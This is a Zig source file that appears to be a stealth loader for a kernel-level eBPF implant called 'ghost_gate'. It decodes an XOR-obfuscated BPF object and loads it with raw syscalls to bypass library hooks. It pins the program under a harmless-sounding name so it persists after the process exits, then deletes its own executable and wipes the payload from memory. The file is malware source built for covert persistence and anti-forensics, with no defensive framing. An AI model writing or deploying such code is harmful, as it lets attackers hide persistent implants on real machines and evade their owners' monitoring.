const std = @import("std");
const syscalls = @import("syscalls.zig");

const BPF_OBJ_PIN: u32 = 6;
const BPF_PROG_LOAD: u32 = 5;

pub fn main() !void {
    // 1. Decrypt Soul (BPF Bytecode)
    var bpf_blob = @constCast(@embedFile("../target/ghost_gate.bpf.o").*);
    for (&bpf_blob) |*b| { b.* ^= 0x5F; }

    // 2. Load into Kernel
    // We use raw syscalls to avoid libc/std hooks
    const prog_fd = syscalls.bpf_call(BPF_PROG_LOAD, &bpf_blob, bpf_blob.len);
    if (prog_fd < 0) std.os.exit(1);

    // 3. Pin to Virtual Filesystem (The "Vanishing Act")
    // Pinned programs stay active even after this process dies
    const pin_path = "/sys/fs/bpf/net_sync_provider";
    _ = syscalls.bpf_obj_pin(@intCast(prog_fd), pin_path);

    // 4. Self-Destruct Traces
    var buf: [1024]u8 = undefined;
    if (std.os.readlink("/proc/self/exe", &buf)) |path| {
        _ = std.os.linux.unlink(path);
    } else |_| {}

    // 5. Hard Exit
    @memset(&bpf_blob, 0);
    std.os.exit(0);
}
